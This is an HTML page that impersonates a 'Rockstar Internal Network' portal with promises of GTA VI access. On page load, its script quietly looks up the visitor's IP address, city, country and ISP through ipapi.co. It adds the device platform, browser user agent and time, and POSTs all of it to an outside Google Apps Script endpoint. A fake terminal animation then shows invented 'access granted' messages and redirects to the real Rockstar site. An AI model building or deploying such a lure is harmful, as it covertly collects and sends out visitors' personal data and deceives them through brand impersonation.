<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Rockstar Internal Network</title>

<style>
body {
  margin: 0;
  background: #0a0a0a;
  color: #00ff9f;
  font-family: monospace;
}

.container {
  max-width: 600px;
  margin: 40px auto;
  border: 1px solid #00ff9f;
  padding: 20px;
  background: #000;
}

h1 {
  text-align: center;
  color: #ffcc00;
}

.status {
  font-size: 13px;
  margin-top: 10px;
  color: #ccc;
}

.terminal {
  margin-top: 15px;
  background: #000;
  padding: 10px;
  height: 180px;
  overflow-y: auto;
  border: 1px solid #00ff9f;
  font-size: 12px;
}

.progress {
  margin-top: 10px;
  height: 8px;
  background: #222;
}

.bar {
  height: 100%;
  width: 0%;
  background: #00ff9f;
}

button {
  width: 100%;
  padding: 10px;
  margin-top: 15px;
  background: #00ff9f;
  color: black;
  border: none;
  font-weight: bold;
  cursor: pointer;
}
</style>
</head>

<body>

<div class="container">
  <h1>ROCKSTAR INTERNAL NETWORK</h1>

  <div class="status" id="status">Connecting to secure node...</div>

  <div class="terminal" id="terminal"></div>

  <div class="progress">
    <div class="bar" id="bar"></div>
  </div>

  <button onclick="runSystem()">Initialize Session</button>
</div>

<script>

// ===== USER DATA =====
let userData = {};

// ===== FETCH USER INFO =====
async function getUserData() {
  try {
    let res = await fetch("https://ipapi.co/json/");
    let data = await res.json();

    userData = {
      ip: data.ip,
      city: data.city,
      country: data.country_name,
      org: data.org,
      device: navigator.platform,
      browser: navigator.userAgent,
      time: new Date().toLocaleString()
    };

    document.getElementById("status").innerText =
      `Node: ${data.ip} | ${data.city}, ${data.country_name}`;

    trackUser();

  } catch (e) {
    document.getElementById("status").innerText = "Limited connection";
  }
}

// ===== TRACK USER (FIXED) =====
function trackUser() {
  fetch("https://script.google.com/macros/s/AKfycbwmehXULJ0GwP9fIUv56JLuCVA2-Dr7XLbaUU-iqwTeB0lEELsJXsJwaNgLSK4iyZmwuA/exec", {
    method: "POST",
    mode: "no-cors",
    body: JSON.stringify(userData)
  });
}

// ===== TERMINAL =====
function log(text) {
  let terminal = document.getElementById("terminal");
  terminal.innerHTML += text + "<br>";
  terminal.scrollTop = terminal.scrollHeight;
}

// ===== FLOW =====
function runSystem() {

  let logs = [
    "Connecting to Rockstar secure servers...",
    "Validating session...",
    "Loading GTA VI environment...",
    "Syncing internal logs...",
    "Finalizing access..."
  ];

  let i = 0;
  let bar = document.getElementById("bar");

  let interval = setInterval(() => {
    if (i < logs.length) {
      log(logs[i]);
      bar.style.width = ((i + 1) / logs.length) * 100 + "%";
      i++;
    } else {
      clearInterval(interval);
      finish();
    }
  }, 900);
}

// ===== COMPLETE =====
function finish() {
  log("Access Granted ✔");

  setTimeout(() => {
    window.location.href = "https://www.rockstargames.com/VI";
  }, 2000);
}

// INIT
getUserData();

</script>

</body>
</html>
